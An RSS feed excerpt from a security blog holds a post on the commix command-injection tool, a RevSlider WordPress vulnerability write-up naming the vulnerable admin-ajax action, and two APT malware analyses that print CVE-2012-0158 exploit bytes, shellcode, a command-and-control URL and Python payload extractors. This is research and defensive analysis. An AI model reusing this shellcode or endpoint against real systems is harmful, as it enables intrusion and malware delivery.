			<pubDate>Sun, 24 May 2015 13:34:58 GMT</pubDate>
			<description>---Quote (Originally by plage)--- 
Hello all, It recently came to my attention a *com*mand *i*njection e*x*ploitation tool, which has the name*...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>plage</strong>
					<a href="showthread.php?p=13878#post13878" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">Hello all, It recently came to my attention a <b>com</b>mand <b>i</b>njection e<b>x</b>ploitation tool, which has the name<b> commix</b> ( 1 ) and by using it, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string.<br />
<br />
Commix seems to be a great command injection tool which successfully exploits many vulnerable applications such as <b>DVWA</b>, <b>bWAPP</b>, <b>ShelLOL</b>,<b> Persistence</b>, <b>Kioptrix(2014)</b>, <b>w3af-moth</b> etc.<br />
<br />
I found references on that tool in many sites, like <b>TrustedSec's Security Podcast Episode 6</b> ( 2 ) <b>softpedia</b> ( 3 ) and <b>packetstormsecurity</b> ( 4 ) and <b>darknet.org.uk </b>( 5 ). As I noted recently it has been added to trustedsec's Penetration Testers Framework (PTF) ( 6 ). In the official github page ( 1 ), several <b>exploitation examples</b> ( 7 ), <b>demos</b> ( 8 ) and examples of <b>combinatorial use of commix with other tools</b> ( 9 ) (i.e metasploit and weevely) are posted .<br />
<br />
<img src="http://s3.postimg.org/qqnv2pm9v/xxx.png" border="0" alt="" /><br />
<br />
<b>References</b><br />
( 1 ) <a href="https://github.com/stasinopoulos/commix" target="_blank">https://github.com/stasinopoulos/commix</a><br />
( 2 ) <a href="https://www.trustedsec.com/may-2015/tsp-episode-6-show-notes/" target="_blank">https://www.trustedsec.com/may-2015/...-6-show-notes/</a><br />
( 3 ) <a href="http://news.softpedia.com/news/Commix-Tool-Tests-Web-Apps-Against-Command-Injection-Flaws-477728.shtml" target="_blank">http://news.softpedia.com/news/Commi...s-477728.shtml</a><br />
( 4 ) <a href="http://packetstormsecurity.com/files/131630/Commix-Command-Injection-Tool.html" target="_blank">http://packetstormsecurity.com/files...tion-Tool.html</a><br />
( 5 ) <a href="http://www.darknet.org.uk/2015/04/commix-command-injection-attack-tool/" target="_blank">http://www.darknet.org.uk/2015/04/co...n-attack-tool/</a><br />
( 6 ) <a href="https://github.com/trustedsec/ptf" target="_blank"> https://github.com/trustedsec/ptf</a><br />
( 7 ) <a href="https://github.com/stasinopoulos/commix/wiki/Usage-Examples" target="_blank">https://github.com/stasinopoulos/com...Usage-Examples</a><br />
( 8 ) <a href="https://www.youtube.com/channel/UCFGVXu3e6jdvyIiSy0mPI4A" target="_blank">https://www.youtube.com/channel/UCFG...jdvyIiSy0mPI4A</a><br />
( 9 ) <a href="https://github.com/stasinopoulos/commix/wiki/Upload-shells" target="_blank">https://github.com/stasinopoulos/com.../Upload-shells</a></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator>plage</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3125</guid>
		</item>
		<item>
			<title>WordPress Plugin – Revslider update captions CSS file critical vulnerability</title>
			<link>http://garage4hackers.com/entry.php?b=3122</link>
			<pubDate>Fri, 27 Mar 2015 18:04:55 GMT</pubDate>
			<description>Today being another day at work for SecureLayer7 to recover our client’s defaced website, and bang I think I hit upon a nasty vulnerability of a...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Today being another day at work for SecureLayer7 to recover our client’s defaced website, and bang I think I hit upon a nasty vulnerability of a famous plugin.<br />
<br />
Although we successfully patched the vulnerability and we fixed the undoing of the blacklisting. On further research I stumbled upon its usage over the internet and as it turns out large number of web users online are affected, putting them to greater risk if not mitigated with a proper patch or an update.<br />
<br />
Following URL is vulnerable to update CSS.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">wp-admin/admin-ajax.php?action=revslider_ajax_action&amp;client_action=get_captions_css</pre>
</div>You can test your website by executing this python <a href="http://pastebin.com/4dVDQcQs" target="_blank">code</a><br />
<br />
After I started digging for the root cause as to what is exactly triggering the bug.  I figured that there is a class file called as revslider_admin.php in the Revslider Plugin folder, where you can find onAjaxAction() function which is actually triggering bug.<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/11.png" border="0" alt="" /><br />
<br />
There is switch call where it is calling another function called as <b>updateCaptionsContentData()</b> as shown in the bellow image .<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/reve_admin.png" border="0" alt="" /><br />
<br />
The updateCaptionsContentData() function is located into inc_php/revslider_operations.class.php , where is the actual cause of bug as you can see writeFile function which is writing content in the file.<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/revslider_operations.class.png" border="0" alt="" /><br />
<br />
You can patch this bug by installing Latest version of Revslide builder. <br />
<br />
<br />
Reference : <a href="http://blog.securelayer7.net/wordpress-plugin-revslider-update-captions-css-file-critical-vulnerability/" target="_blank">http://blog.securelayer7.net/wordpre...vulnerability/</a></blockquote>


<!-- attachments -->
	<div class="blogattachments">
		
		
			<fieldset class="blogcontent">
				<legend>Attached Images</legend>
				
			</fieldset>
		
		
		

	</div>
<!-- / attachments -->
]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3122</guid>
		</item>
		<item>
			<title>Apt inception</title>
			<link>http://garage4hackers.com/entry.php?b=3121</link>
			<pubDate>Mon, 23 Mar 2015 11:39:40 GMT</pubDate>
			<description><![CDATA[Greet: "Vinnu", "nightrover","bond" 
 
In the month of Dec 2014 BlueCoat...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet: &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
In the month of Dec 2014 <a href="https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-inception-framework%E2%80%9D-very-sophisticated-layered-malware" target="_blank">BlueCoat</a> released report on APT campaign named ad &quot;Inception&quot;. The spear phishing mail was sent with attachment with various names we analyzed attachment which was named as &quot;Car for sale.doc&quot;. The Attachment was exploit (CVE-2012-0158) with embed VBS and decoy file themed an advertisement of a used car for sale that purportedly originated from Michael Hahne employee at the German Embassy. <br />
For writing this blog our main moto was to automate Extraction of large payload and decoy file used in APT Inception so that it can save time of researchers to extract payloads and possibly new varient of the malware.<br />
Decoy File<br />
------------<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=839&amp;d=1427109979" border="0" alt="Name:  1.JPG
Views: 196
Size:  39.2 KB"  /><br />
<br />
Payload<br />
---------<br />
VBE File -&gt; VBS File -&gt; Dll File -&gt; C2<br />
<br />
C2 Info<br />
--------<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://webdav.cloudme.com/chloe7400/CloudDrive/</pre>
</div>The sample we used can trigger vulnerability in both on MS office 2007 and MS office 2010. <br />
The following is the code attackers used<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">60016327FE6E6027454B414A4F45474A624A5F27303C58274241EB0C5F2858276EE55D277DFB5C274241EB04A2266027454A414A484A4E4A4A474D4281C41C010000FFE4AABC6127D41158276C0B5E27690D5E27100104000000010000000100F2C95C2724F3C0CC00BDEF9312EA95AC34A30DB700800000512B6027F11A5827B05154EC377F612749EC59274BC249C312313DE61CA07EC38CED582746EA592787946EAD923813C8F3C95C27F3C95C27F3C95C27AABC6127000A632759526227F2C95C2729565ADADC587CCF04574592000C0000E38C6127000A6327D354602728BC6027F11A582767EFC8DB12CB9FE4AC9D4BCDF2C95C2780000000512B6027DEB15C2766BB262666BB26264B4B414A4748434F4742434A434B42414149434F42414E4F494A4142434F484F434A4B4848434343484A4E41424A4E43464B424842484848474746424A4742424F4B464B4F434B4A4F464848484641434A4E4E4E484F48474241424E484B484748484848</pre>
</div>Attackers also used Following code instead of the Nop Slide.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">4B4B414A4748434F4742434A434B42414149434F42414E4F494A4142434F484F434A4B4848434343484A4E41424A4E43464B424842484848474746424A4742424F4B464B4F434B4A4F464848484641434A4E4E4E484F48474241424E484B484748484848</pre>
</div>We used following sample for creating extraction code:<br />
Md5 : 4624da84cae0f8b689169e24be8f7410<br />
Exploit - CVE-2012-0158<br />
<br />
Shell Code used in this sample was:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">6081ec001000008bec33c9648b35300000008b760c8b761c8b5e088b46088b7e208b3666394f1875f2e8050000009090909090895d04894508ff750868ad9b7ddfe8bf000000894520ff75086854caaf91e8af000000894524ff750868ac08da76e89f000000894528ff7508681665fa10e88f00000089452c6a045e5456ff552089859400000083f8ff750683c60456ebe983f80076f56a006a0068e657000056ff55288d85900000006a00506a088d859c0000005056ff552c81bd9c0000005054405475c689b5980000006a406800100000ffb5a00000006a00ff55248985a40000008d9d900000006a0053ffb5a000000050ffb598000000ff552c8b9da4000000ffe3558bec578b7d088b5d0c568b733c8b74337803f3568b762003f333c94941ad03c35633f60fbe1038d67408c1ce0d03f240ebf13bfe5e75e55a8beb8b5a2403dd668b0c4b8b5a1c03dd8b048b03c55e5f5dc2080</pre>
</div>After analysing sample we came with the Python Extractor which can be used for extracting Malware &amp; Decoy from the attachment/Doc exploit used in this Campaign:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decryption(file_size,file_decrypt):
        comp = &quot;&quot;
        xor_key = &quot;&quot;
        a = file_size-1
        for i in range(file_size-1,0,-1):
                xor_key = a % 0x100
                comp += chr(ord(file_decrypt[i]) ^ xor_key)
                a = a - 1
        comp1 = &quot;&quot;
        a1 = len(comp)-1
        for i in range (0,len(comp)-1,1):
            comp1 += comp[a1]
            a1 = a1 - 1
        return comp1

def vbs_swap(data):
    compl = &quot;&quot;
    a = 0
    b = 1
    comp = &quot;&quot;
    for i in range (0,0x200,2):
        compl += data[b]+data[a]
        a = a + 2
        b = b + 2
    comp = compl + data[0x200:]
    return comp

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        fl = file.read()
        file.close()
        
        if fl[:4] == &quot;{\\rt&quot;:
            found = fl.find(&quot;VPdPD&quot;)
            print &quot;Processing_APT_Inception_&quot; + sample
            file_decrypt = &quot;&quot;
            if found &gt; -1:
                file_decrypt = fl[found+0x1d:]
                file_size = len(file_decrypt)
                comp = decryption(file_size,file_decrypt)
                data = binascii.unhexlify('D0CF11')
                doc_file = comp.find(data)
                vbs_file = comp[8:doc_file]
                vbs_data = vbs_swap(vbs_file)
                doc_file1 = comp[doc_file:]
                vbs_ex = open(output+sample+&quot;.vbs&quot;,&quot;wb&quot;)
                vbs_ex.write(vbs_data)
                vbs_ex.close()
                doc_ex = open(output+sample+&quot;.doc&quot;,&quot;wb&quot;)
                doc_ex.write(doc_file1)
                doc_ex.close()
                mov_processed_file()
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3121</guid>
		</item>
		<item>
			<title>Apt sme</title>
			<link>http://garage4hackers.com/entry.php?b=3117</link>
			<pubDate>Fri, 20 Mar 2015 06:11:43 GMT</pubDate>
			<description><![CDATA[Greet : "Vinnu", "nightrover","bond" 
 
I have used name "APT SME " because payload developer have used the name for his project.I have just created...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet : &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
I have used name &quot;APT SME &quot; because payload developer have used the name for his project.I have just created automation to exctract payload  file from the exploit used in APT SME.<br />
<br />
Sample used for creating Automation:<br />
Md5 - 57A8DB5A5D35464BE16518332A64A992<br />
<br />
Shellcode:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">e80000000081efb178fd9401f76681e6a9008b04248d7424186681cfa81d83c40181f782e7813383c40281e7e3000000446681eeb25e83e8056689ff66c1ef7905c00000006681e7bc00bb84feffffc1e66cf7db8d7c241883e20066c1e6f880e50001f680c5378d74242080c5b46601f666478a0883e76e01fe30e96681ce483df6c101751581f782e7813380c1016681cee476eb106681f7ecf181ce63af2725fec9c1e63bc1efed880866c1e74d83c2016629f783e8ff8d7c240439da75b1db238e619bda619ce6619cf66184e261acca61dc8cd3a2f29f1861afd661beef92eb006198caeb04db23ab47eb0261f2c1b2ee6b110fca37159f05a361b0ceeb018c61e6a161b0f6eb01e9c661bfdb318c6b2115e5a980e2b961aecee2153a6f2a9f0752a5a588886335459f02459f0f6bd54d4d31319f32bcbdb963146904e2537344e8ea522f77f66b5579ebeaeb1d0dd8ecac0813b1b5b4d747f370699f5a692deeb3bddb235c38546744e8ea60fd6a10ea9ee36a2ceed2189ee8da1862fdabadd31b9f02b58c53a7b08c63e5bddb238e619bda619ce6619cf66184e26194ca61dcd2a5f29f1901a3b58207d38bf0153d821515e5ea15dece82eaeaeeea153aefeafaeaeaba159eceeedb232deaeaeaeaea692bee692aee6b13ea7ae9ea9f06b4b553cfe6eaeabc6b2c8248e8eabd194e29025815151561afd661b6ef92eb0161a1f209d8a361a9caeb0261de62eb04db2a7346eb282b20e7a2931dd1beceee9f0b61a9ceeb028c61e6a261a9f6eb0261ee62eb026313b0b4b82900</pre>
</div>Extractor :<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decoder(rev):
        DH = 0x0D2
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            #print ord(rev[j])
            #print ord(rev[0x5d])
            if ord(rev[d]) == 0:
                #print d
                comp += rev[d]
               
            else:
                DH = DH + 0x4
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
       
def mov_hex(data):
        rev = &quot;&quot;
        a = 0
        b = 1
        c = &quot;&quot;
        #print data
        for i in range (0,len(data),2):
                c = data[a] + data[b]
                c = c.decode(&quot;hex&quot;)
                rev += c
                a = a + 2
                b = b + 2
        return rev
    

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        file1 = file.read()
        file.close()

        if file1[:4] == &quot;{\\rt&quot;:
            print &quot;Processing_APT_SME&quot; + sample
            found = file1.find(&quot;4f4f6262&quot;)
            print found
            if found &gt; -1:
                data = file1[found+26:found + 0x58398]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                rev = mov_hex(data)
                comp = decoder(rev)
                comp = &quot;MZ&quot; + comp[2:0x2a268]
                fil = open(output+sample+&quot;.exe_&quot;,&quot;wb&quot;)
                fil.write(comp)
                fil.close()
                mov_processed_file()
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3117</guid>
		</item>
	</channel>
</rss>
